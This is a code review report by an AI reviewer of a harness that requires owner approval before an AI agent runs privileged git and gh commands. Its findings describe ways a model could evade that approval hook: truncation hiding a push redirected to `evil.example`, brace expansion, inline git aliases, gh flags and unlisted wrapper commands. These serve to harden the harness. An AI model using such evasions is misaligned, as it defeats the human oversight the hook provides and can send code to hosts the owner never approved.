---
phase: 04-profiles-retrieval-budgets-restricted-mode-and-the-portabili
reviewed: 2026-11-23T00:00:00Z
depth: standard
diff_base: 9cee031
files_reviewed: 80
files_reviewed_list:
  - scripts/eval-retrieval.ts
  - scripts/exit-run-phase4-tools.ts
  - scripts/exit-run-phase4.sh
  - src/adapters/context/git-files.ts
  - src/adapters/context/gsd-graph.ts
  - src/adapters/context/gsd-intel.ts
  - src/adapters/context/gsd-planning.ts
  - src/adapters/credential/cmd.ts
  - src/adapters/diagnostics/probes.ts
  - src/adapters/fs/profile-bindings.ts
  - src/adapters/fs/profile-config.ts
  - src/adapters/fs/profile-paths.ts
  - src/adapters/fs/profile-registry.ts
  - src/adapters/git/promotion.ts
  - src/adapters/host-claude/attended-hook-install.ts
  - src/app/authorize.ts
  - src/app/context.ts
  - src/app/derive-spec.ts
  - src/app/doctor.ts
  - src/app/invocation.ts
  - src/app/resume.ts
  - src/app/retrieval-guard.ts
  - src/app/run-resume.ts
  - src/app/run-stages/item.ts
  - src/app/run-stages/restricted.ts
  - src/app/stages/index-knowledge.ts
  - src/app/stages/promote.ts
  - src/app/stages/shared.ts
  - src/cli/commands/approve.ts
  - src/cli/commands/install-host.ts
  - src/cli/doctor-deps.ts
  - src/domain/enforcement-map.ts
  - src/domain/hook-decision.ts
  - src/domain/knowledge-corpus.ts
  - src/domain/privileged-commands.ts
  - src/hook/pre-tool-use.ts
  - src/ports/context-source.ts
  - src/ports/diagnostics.ts
  - test/benchmark/phase4/eval-verdict-adr016.json
  - test/fault/approval-consume.test.ts
  - test/fault/bindings-race.test.ts
  - test/fault/privileged-no-replay.test.ts
  - test/fault/retrieval-race.test.ts
  - test/fixtures/claude-fake/claude-replay.mjs
  - test/fixtures/json-shapes/context-active.json
  - test/helpers/approval-consume-child.ts
  - test/helpers/bindings-race-child.ts
  - test/helpers/fake-claude.ts
  - test/helpers/planning-heading-child.ts
  - test/helpers/retrieval-race-child.ts
  - test/helpers/shell-oracle.ts
  - test/helpers/unix-socket-file.ts
  - test/integration/approvals.test.ts
  - test/integration/artifact-redaction.test.ts
  - test/integration/context-adapters.test.ts
  - test/integration/context.test.ts
  - test/integration/credential-broker.test.ts
  - test/integration/doctor.test.ts
  - test/integration/hook-privileged.test.ts
  - test/integration/hook-retrieval.test.ts
  - test/integration/install-host.test.ts
  - test/integration/knowledge-cost-cap.test.ts
  - test/integration/lease.test.ts
  - test/integration/profile-selection.test.ts
  - test/integration/promotion.test.ts
  - test/integration/refresh-scoped.test.ts
  - test/integration/restricted-mode.test.ts
  - test/integration/resume-reap.test.ts
  - test/integration/run-sandbox-other-profiles.test.ts
  - test/integration/run-spec-derivation.test.ts
  - test/unit/credential-ref.test.ts
  - test/unit/enforcement-map.test.ts
  - test/unit/eval-retrieval.test.ts
  - test/unit/exit-run-phase4-tools.test.ts
  - test/unit/gsd-planning-headings.test.ts
  - test/unit/hook-decision.test.ts
  - test/unit/knowledge-cost-cap.test.ts
  - test/unit/privileged-commands.test.ts
  - test/unit/profile-config.test.ts
  - test/unit/profile-registry.test.ts
findings:
  critical: 1
  warning: 7
  info: 5
  total: 13
status: issues_found
---

# Phase 04: Code Review Report (gap-closure changes since 9cee031)

**Reviewed:** 2026-11-23
**Depth:** standard
**Files Reviewed:** 80 (38 source and script files, 42 test, fixture and helper files)
**Status:** issues_found
**Diff base:** 9cee031 (incremental; prior review and triage are 04-REVIEW.md and 04-REVIEW-DISPOSITION.md, not repeated here)

## Summary

The scope is the gap-closure work of plans 04-40 through 04-55 plus the post-merge fix commits. The shell scanner in `privileged-commands.ts` is a large improvement: I ran about 190 probe lines through `classifyLine` (quotes, here-documents, substitutions, wrappers, limits, comments) and the scanner behaved correctly on all of them, including the fail-closed `unparseable` cases. `npm run typecheck` passes. The defects below are in what the scanner and its callers still do not see, in what the owner is shown when approving, and in a few new adapters and tests.

The one critical finding is that the approval prompt shows each bound parameter cut to 80 characters, and the parameters that CR-03's fix added (`gitOptions`, `env`) are exactly the long, redirecting ones. The digest binds the full text; the owner cannot read it.

Three warnings are classification evasions of listed forms with ordinary shell or tool syntax (gh persistent flags, brace expansion, git aliases defined on the same line). They are the same class as the already-fixed WR-01 and WR-03 and are rated the same. The remaining warnings are a restricted-run patch that is dropped whole for a file name with a space, a lock that can never be taken over after PID reuse, WR-17's fix being incomplete for a corrupt config, and a new race test that does not prove overlap (the WR-42 class).

## Critical Issues

### GCR-01: The approval prompt cuts every bound value at 80 characters, so the `gitOptions` and `env` that CR-03's fix binds can be hidden from the owner (cites CR-03)

**File:** `src/domain/approval.ts:10,44-66` (consumed by `src/cli/commands/approve.ts:84-92` and `src/hook/pre-tool-use.ts:338-339`)
**Issue:** `approve` shows the owner only `request.paramsSummary`, which `paramsSummary` builds with each value passed through `clip(..., 80)` and the whole line clipped to 400. The fix for CR-03 binds git's global options (`gitOptions`, verbatim) and every environment assignment (`env`, verbatim) into the digest, so the digest covers the full text, but the owner is told "grants: one use ... with exactly these parameters" while seeing a prefix. A model that wants to redirect a push pads the first option past 80 characters, for example `git -c core.x=<80 characters> -c url.https://evil.example/.insteadOf=git@github.com: push origin main`. The prompt shows `gitOptions=-c core.x=aaaa…` and the redirecting option is invisible. The same holds for `env` (`GIT_SSH_COMMAND=...`, `HOME=...`) and for a long `remote` URL or `refspec`. I confirmed the cut with a realistic command: `gitOptions=-c url.https://example.org/some/long/path/.insteadOf=git@github.com: -C ../othe…` and `env=GIT_SSH_COMMAND=ssh -i ... StrictHostKeyChecking=no H…` (the `HOME=` assignment is cut off). The `line` parameter, which binds the whole command, is shown only as an opaque `sha256:` value, so nothing else lets the owner read the command. The effect is the one CR-03 described (an approved push goes to a target the owner did not see), reached through the display instead of the digest.
**Fix:** An approval must show everything it binds, or refuse to bind what it cannot show. Either (a) in `classifyLine`, mark a command `unapprovable` (reason: "a bound value is longer than the approval prompt can show") when any value of `gitOptions`, `env`, `remote`, `refspec` or `endpoint` exceeds the display cap, so the hook denies it with `privileged:unapprovable`; or (b) store the full parameter values in the `approval.requested` event (redacted on write, bounded to a few KiB) and print them in full, one per line, in `approve`. Add a test in `test/integration/hook-privileged.test.ts` that approves a line whose `gitOptions` is longer than 80 characters and asserts the prompt shows the whole value or the line is refused.

## Warnings

### GWR-01: `gh pr -R <repo> create` and the other forms with a persistent flag between the group and the subcommand are not classified (cites WR-03 for the analogous npm case)

**File:** `src/domain/privileged-commands.ts:781-784`
**Issue:** `classifyGh` takes the form from `args[0]` and `args[1]` exactly (`pr create`, `pr merge`, `pr edit`, `release create`). `-R/--repo` is a persistent flag of the `pr` and `release` groups in gh, so `gh pr -R owner/repo create` runs `pr create` (I confirmed with the installed gh: `gh pr -R cli/cli create --help` prints the create help). `classifyLine` returns `none` for `gh pr -R x/y create`, `gh pr --repo=x/y merge 1` and `gh release -R x create v1`, so the attended hook does not see them and no approval is asked. The same defect was fixed for npm in WR-03; gh was not given the same treatment.
**Fix:** In `classifyGh`, skip leading options (with their values, for `-R`, `--repo`, `-H`/`--hostname` where the group defines them) after `args[0]` before reading the subcommand, the way `classifyNpm` does:
```ts
const group = args[0];
let at = 1;
while (at < args.length && args[at]!.startsWith('-')) at += GH_GROUP_VALUED.includes(args[at]!) ? 2 : 1;
const key = group === 'api' ? 'api' : `${group ?? ''} ${args[at] ?? ''}`;
```
Add `gh pr -R x/y create`, `gh pr --repo=x/y merge 1` and `gh release -R x create v1` to the shell-oracle corpus in `test/unit/privileged-commands.test.ts`.

### GWR-02: Brace expansion hides a privileged command, and neither the scanner nor the documented residuals mention it

**File:** `src/domain/privileged-commands.ts:97,182-285` (word reading); `src/domain/enforcement-map.ts:94-98` (the residual list)
**Issue:** `git pus{h,}`, `{git,push}` and `g{i,}t push` expand in bash and zsh to `git push`; `classifyLine` returns `none` for each. Brace expansion is static (no variable, no file system), so it is unlike the run-time names the residual list names (variables, aliases, functions, scripts, a shell started on a computed string). The enforcement-map text and the header comment give that list as the complete set of what an approval does not cover, so the gap is also undocumented. The scanner handles the other static obfuscations (`g""it`, `$'\x67it'`, `\git`, backslash-newline).
**Fix:** Either expand braces (a word with an unquoted `{...,...}` group yields the cross product of its alternatives, capped, with an over-cap word making the line `unparseable`), or treat any unquoted word that holds a brace group with a comma or `..` in a command-name or first-argument position as `unparseable` (fail closed, as for the hook's own brace rule for globs), and add "brace expansion and pathname globbing" to the residual list in `ENFORCEMENT_MAP` and `docs/system` if glob words are left unhandled.

### GWR-03: A git alias defined on the same line (`git -c alias.p=push p`) is not classified

**File:** `src/domain/privileged-commands.ts:732-748`
**Issue:** `classifyGit` reads the subcommand after the global options and compares it to `push`. `git -c alias.p=push p origin main` (also `git -c alias.p='!git push' p`, `git --config-env=alias.p=VAR p`, and `GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=alias.p GIT_CONFIG_VALUE_0=push git p`) pushes, and `classifyLine` returns `none`. The command carries its own definition, so unlike an alias set by an earlier separate call (a documented residual) the classifier has everything it needs.
**Fix:** In `classifyGit`, collect `alias.<name>` definitions from the `-c`/`--config-env` values and the `GIT_CONFIG_KEY_n`/`GIT_CONFIG_VALUE_n` assignments in the prefix; when the subcommand word names a defined alias, classify the alias value (its first word, or the `!` command through `classifyString`) instead of the word. A simpler fail-closed form: when any global option or assignment sets a key beginning `alias.`, return `unparseable` for the command.

### GWR-04: One out-of-scope file with an ordinary name makes `patch()` refuse, so the whole restricted patch is dropped (cites WR-13)

**File:** `src/app/run-stages/restricted.ts:224-225`; `src/adapters/git/run-workspace.ts:663-668`
**Issue:** The WR-13 fix passes the host's out-of-scope paths as `exclude` to `workspace.patch`. `patch()` accepts only `/^[A-Za-z0-9._][A-Za-z0-9._/-]*$/` for an excluded name (it was written for directories such as `.avarice-restricted`). The paths come from the host's own work in the clone, so a changed path outside the contract's scope that contains a space, `@`, `+`, a non-ASCII letter, a bracket or a leading `-` (`package-lock 2.json`, `docs/Café.md`, `notes (copy).md`) makes `patch()` return `invalid`. `readOutputs` then records "the patch could not be built ... and was not stored", and the owner receives no patch at all, including the in-scope edits, although the contract says the out-of-scope path alone is left out. A host that is not trusted can also use this to withhold its own patch.
**Fix:** Build the exclusion with literal pathspecs instead of the directory validator: add a `patch` option such as `excludePaths` that runs git with `literalPathspecs: true` and `:(exclude,literal)<path>` (checking only that the path is relative, has no `..` segment and no NUL), keep the strict check for `exclude` directories, and add a test in `test/integration/restricted-mode.test.ts` with an out-of-scope file named `a b.txt` beside an in-scope edit that asserts the patch holds the in-scope edit.

### GWR-05: A bindings lock left by a crashed writer whose PID is reused is never taken over, so every binding write fails with `unavailable`

**File:** `src/adapters/fs/profile-bindings.ts:164-175,177-205`
**Issue:** `inspectLock` calls a lock stale only when `process.kill(pid, 0)` reports the holder gone. The lock stores `startedAt`, and the header comment says the lock holds "this process's ID and start time", but the start time is never compared with the live process, so a crashed writer's lock is held forever once another process (any process) takes its PID. Every `writeBinding` and `backfillBindings` then waits 2 seconds and returns `unavailable`, and nothing but a manual delete clears it. The same registry decides which profile a repository opens under, so the failure blocks `profile bind` and the backfill for good.
**Fix:** Treat the lock as stale when the live process with that PID started after the lock's `startedAt` (read the start time with `ps -o lstart= -p <pid>` or `/proc/<pid>/stat`), or when the lock file's mtime is older than a generous bound (for example 60 seconds, far above one registry rewrite) regardless of the PID. Add a test that plants a lock naming a live PID with a `startedAt` from before that process started.

### GWR-06: A corrupt profile config is still skipped, so its profile's roots are not denied; WR-17's fix covers only an unreadable one (cites WR-17)

**File:** `src/adapters/fs/profile-registry.ts:79-91`
**Issue:** After the fix, a config the system refused to read (EACCES, EPERM) gets its whole default root denied, and an I/O failure stops the computation, but a config that is present and corrupt (invalid JSON, a key the parser refuses, a symbolic link, oversize) falls to `continue` with nothing added. The profile's data root and work root then stay readable to the other profile's sandboxed commands, although its stored data is still there and a planted corrupt config is the cheapest way to remove a profile from the deny list. The comment on `knownProfileRoots` ("a list that could not be computed must not read as a shorter one") applies to this case as much as to the other two.
**Fix:** For an `invalid` read error, deny the same whole root as for a permission refusal (`wholeRootOf(home, entry, options.home)`), and keep the corrupt-config skip only for a directory that is not a profile. Update `test/unit/profile-registry.test.ts` (the "corrupt config is skipped" expectation) to assert the whole-root denial.

### GWR-07: The new bindings race test never shows that the two writers overlapped, which is the defect WR-42 recorded for the other race tests (cites WR-42)

**File:** `test/fault/bindings-race.test.ts:62-82`; `test/helpers/bindings-race-child.ts:19-30`
**Issue:** The test releases two children at one start time and checks that all 40 bindings survive. Neither child records when its calls started or returned, and the test never checks that a call of one child ran while a call of the other was in progress. If the children run one after the other (a slow process start, a loaded machine, one child finishing its 20 writes before the other leaves its spin loop), the registry holds 40 bindings with or without the lock, and the test passes without showing the race. WR-42's fix gave the approval and retrieval race tests a timing record and an "exercised" assertion; this test, added by the same plans, did not get one.
**Fix:** Have the child print `calledAt` and `returnedAt` per call (as `approval-consume-child.ts` does, `performance.timeOrigin + performance.now()`), assert that at least one pair of calls from A and B overlapped, and retry the run a few times before failing with "the race was not exercised", as `approval-consume.test.ts` does. To show that the test discriminates, add a variant that calls the unlocked read-modify-write and asserts that it loses a binding.

## Info

### GIN-01: A here-document with an unquoted delimiter is scanned twice, so one `$(git push)` in it asks for two approvals

**File:** `src/domain/privileged-commands.ts:325-343`
**Issue:** `readBodies` scans the body as commands (tolerantly) and, when the delimiter is unquoted, again with `scanExpansions`. `cat <<EOF >out\n$(git push)\nEOF` returns two `git.push` commands; the shell would run one. In attended mode `consumeLine` then needs two approvals of the same digest, and the denial names one request twice, so the owner approves, runs the line again, and is asked again.
**Fix:** In `readBodies`, scan the body once: when the delimiter is unquoted, run `scanCommands` (which already reaches `$(...)` and backticks inside words) and skip `scanExpansions`, or de-duplicate commands that come from the same source span.

### GIN-02: The wrapper and launcher list is a fixed allow-list; common ones are missing and the residual text does not name them

**File:** `src/domain/privileged-commands.ts:442-460,861-867`
**Issue:** `find . -exec git push \;`, `su -c 'git push'`, `watch git push`, `parallel git push`, `doas git push`, `taskset 1 git push`, `arch -arm64 git push`, `caffeinate git push`, `unbuffer git push`, `trap 'git push' EXIT`, `coproc git push` and a here-string into a shell (`bash <<< 'git push'`) all return `none`. The text pipe into a shell is documented; a here-string is the same case written differently. These are lower value than GWR-01 to GWR-03 but each is a one-line addition or one more named residual.
**Fix:** Add `doas`, `su -c`, `find -exec/-execdir`, `parallel`, `watch`, `taskset`, `arch`, `caffeinate`, `unbuffer`, `chronic`, `coproc` and `trap` (string argument) to the wrappers, treat `<<<` into a shell like a here-document, and list what remains in the enforcement-map residuals.

### GIN-03: A Grep with a brace glob is refused with a reason that says it has no glob

**File:** `src/domain/hook-decision.ts:155-156,876`
**Issue:** Since WR-06's fix, `glob: "*.{ts,tsx}"` (a very common filter) counts as unfiltered, and at the clone root it is refused with "a search of the whole repository with no glob or type filter is not authorized for this run". The model gave a glob, reads the message as wrong, retries variants, and the consecutive-denials limit can then stop the run. The behavior is documented as the safe direction; the text is not accurate for this case.
**Fix:** Name the cause in the reason when the call had a glob: "a glob with a brace group is treated as matching every file; use a separate glob for each extension or a `type` filter".

### GIN-04: `stepSpendUsd` records the whole cap for any step with no `invocation.finished`, even a step that never started a model

**File:** `scripts/eval-retrieval.ts:863-867`
**Issue:** `floor = capUsd` whenever `costs.finished === 0`, including a step that exited before any host started (a refused CLI, a setup failure). The over-record is in the safe direction (the ledger ceiling is the mechanical guard, and the file header says so), but a handful of early failures can consume the Phase 4 ceiling with spend that never happened, and the record then cannot be told apart from a real killed invocation.
**Fix:** Record the cap only when the step's exit code is null or a host start was seen (`invocation.started` without a `finished`), and record 0 with a note for a step that exited non-zero before any start event.

### GIN-05: A reused pack item keeps the flags it was built with

**File:** `src/app/context.ts:353-468`; `src/app/derive-spec.ts:39-48`
**Issue:** `request.reuse` returns previous items "without a read". An item built before WR-18 and WR-19 lacks `untrusted` (gsd-intel, a graph code node with a foreign neighbour) and `codeNode` (every graph code node). If such an item is stamped for the same profile and read scope, it is reused as it is: the intel text is printed unfenced, and `cited()` now returns nothing for it, because `codeNode !== true`. Nothing in the reuse key says which build of the adapters made the item. This matters only for a store that holds packs from before the change.
**Fix:** Add a pack format version to the stamp (`profile`, `accessScope`, `format`) and treat an item with an older or absent `format` as a miss, so it is read again.

---

_Reviewed: 2026-11-23_
_Reviewer: Claude (gsd-code-reviewer)_
_Depth: standard_
